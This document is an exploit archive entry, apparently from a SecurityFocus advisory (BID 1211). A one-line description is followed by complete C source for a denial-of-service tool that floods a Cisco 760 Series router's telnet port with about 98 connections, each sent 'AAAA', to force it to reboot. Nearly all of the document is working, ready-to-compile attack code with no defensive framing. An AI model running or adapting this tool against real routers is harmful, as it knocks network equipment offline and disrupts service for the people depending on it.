source: http://www.securityfocus.com/bid/1211/info

Opening approximately 98 connections on port 23 will cause Cisco 760 Series Routers to self reboot. Continuously repeating this action will result in a denial of service attack.

/* Cisco 760 Series Connection Overflow
 *
 *
 * Written by: Tiz.Telesup
 * Affected Systems: Routers Cisco 760 Series, I havn't tested anymore
 * Tested on: FreeBSD 4.0 and Linux RedHat 6.0
 */


#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int     net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, char *sourceip,
        unsigned short int sourceport, int sec);


void    net_write (int fd, const char *str, ...);


unsigned long int       net_resolve (char *host);



        
void
usage (void)
{
        printf ("usage: ./cisco host times\n");
        exit (EXIT_FAILURE);
}


int
main (int argc, char *argv[])
{


        char                    host[256];
        int                     port,times,count,sd = 0;
        int                     m = 0;
        struct sockaddr_in      cs;


        printf ("Cisco 760 series Connection Overflow.\n");
        printf ("-------------------------------------\n");
        
        if (argc < 3)
        usage();
        
        strcpy (host, argv[1]);
        times=atoi (argv[2]);
        
        if ((times < 1) || (times > 10000)) /*Maximum number of connections*/
                usage();



        port =23; /* This might be changed to the telnet port of the router*/
        


        printf ("Host: %s Times: %d\n", host, times);
        for (count=0;count<times;count++){
                printf ("Connecting... Connection number %d \n",count);
                fflush (stdout);
                sd = net_connect (&cs, host, port, NULL, 0, 30);


                if (sd < 1) {
                        printf ("failed!\n");
                        exit (EXIT_FAILURE);
                        }


        
                net_write (sd, "AAAA\n\n");


        }


        exit (EXIT_SUCCESS);
}


int
net_connect (struct sockaddr_in *cs, char *server, unsigned short int port, char *sourceip,
                unsigned short int sourceport, int sec)
{
        int             n, len, error, flags;
        int             fd;
        struct timeval  tv;
        fd_set          rset, wset;


        /* first allocate a socket */
        cs->sin_family = AF_INET;
        cs->sin_port = htons (port);


        fd = socket (cs->sin_family, SOCK_STREAM, 0);
        if (fd == -1)
                return (-1);


        if (!(cs->sin_addr.s_addr = net_resolve (server))) {
                close (fd);
                return (-1);
        }


        flags = fcntl (fd, F_GETFL, 0);
        if (flags == -1) {
                close (fd);
                return (-1);
        }
        n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
        if (n == -1) {
                close (fd);
                return (-1);
        }


        error = 0;


        n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
        if (n < 0) {
                if (errno != EINPROGRESS) {
                        close (fd);
                        return (-1);
                }
        }
        if (n == 0)
                goto done;


        FD_ZERO(&rset);
        FD_ZERO(&wset);
        FD_SET(fd, &rset);
        FD_SET(fd, &wset);
        tv.tv_sec = sec;
        tv.tv_usec = 0;


        n = select(fd + 1, &rset, &wset, NULL, &tv);
        if (n == 0) {
                close(fd);
                errno = ETIMEDOUT;
                return (-1);
        }
        if (n == -1)
                return (-1);


        if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
                if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
                        len = sizeof(error);
                        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
                                errno = ETIMEDOUT;
                                return (-1);
                        }
                        if (error == 0) {
                                goto done;
                        } else {
                                errno = error;
                                return (-1);
                        }
                }
        } else
                return (-1);


done:
        n = fcntl(fd, F_SETFL, flags);
        if (n == -1)
                return (-1);
        return (fd);
}


unsigned long int
net_resolve (char *host)
{
        long            i;
        struct hostent  *he;


        i = inet_addr(host);
        if (i == -1) {
                he = gethostbyname(host);
                if (he == NULL) {
                        return (0);
                } else {
                        return (*(unsigned long *) he->h_addr);
                }
        }
        return (i);
}


void
net_write (int fd, const char *str, ...)
{
        char    tmp[8192];
        va_list vl;
        int     i;


        va_start(vl, str);
        memset(tmp, 0, sizeof(tmp));
        i = vsnprintf(tmp, sizeof(tmp), str, vl);
        va_end(vl);


        send(fd, tmp, i, 0);
        return;
}